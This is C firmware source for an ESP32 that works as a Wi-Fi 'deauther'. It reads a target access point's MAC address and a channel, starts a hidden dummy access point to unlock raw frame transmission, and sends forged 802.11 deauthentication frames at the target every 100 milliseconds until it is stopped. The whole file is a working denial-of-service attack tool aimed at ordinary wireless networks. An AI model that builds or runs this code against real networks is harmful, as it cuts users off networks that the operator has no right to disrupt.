
/*
    This declaration gives access to the esp_wifi_80211_tx function,
    which gives the ability to send raw arbitrary 802.11 frames.
*/
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

uint8_t* frame;

void deauther(){
    // Read the target MAC address from the host
    uint8_t targetBSSID[6];
    for(int i=0; i<6; i++){
        int c;
        do{
            c = getchar();
        }while(c==-1); // If read failed, try again
        targetBSSID[i] = c;
    }

    // Read the channel from the host
    int channel;
    do{
        channel = getchar();
    }while(channel==-1);

    // Set up the wifi for sending out frames
    ESP_ERROR_CHECK(esp_netif_init());
	ESP_ERROR_CHECK(esp_event_loop_create_default());
	esp_netif_create_default_wifi_ap();
    // Init dummy AP to specify a channel and get WiFi hardware into
	// a mode where we can send the actual fake beacon frames.
	ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
	wifi_config_t ap_config = {
		.ap = {
			.ssid = "a",
			.ssid_len = 0,
			.password = "password",
			.channel = channel,
			.authmode = WIFI_AUTH_WPA2_PSK,
			.ssid_hidden = 1,
			.max_connection = 4,
			.beacon_interval = 100
		}
	};
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
	ESP_ERROR_CHECK(esp_wifi_start());
	ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

    // Assemble the deauth frame
    frame = (uint8_t*)malloc(26);
    memcpy(frame, deauthFrame_p1, 10);
    memcpy(frame+10, targetBSSID, 6);
    memcpy(frame+16, targetBSSID, 6);
    memcpy(frame+22, deauthFrame_p2, 4);

    while(1){
        // Send the deauth frame every 100ms
        esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }
}

TaskHandle_t deautherTaskHandle;

void runDeauther(){
    xTaskCreate(deauther, "deauther", 4096, NULL, 5, &deautherTaskHandle);
    vTaskDelay(500 / portTICK_PERIOD_MS); // Wait for the task to start
    // Start checking for 'q' to stop the task (we can do this now because 500ms is long enough for the deauth task to have read everything it needs from the buffer)
    while(getchar() != 'q'){
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }
    vTaskDelete(deautherTaskHandle);
    free(frame);
}
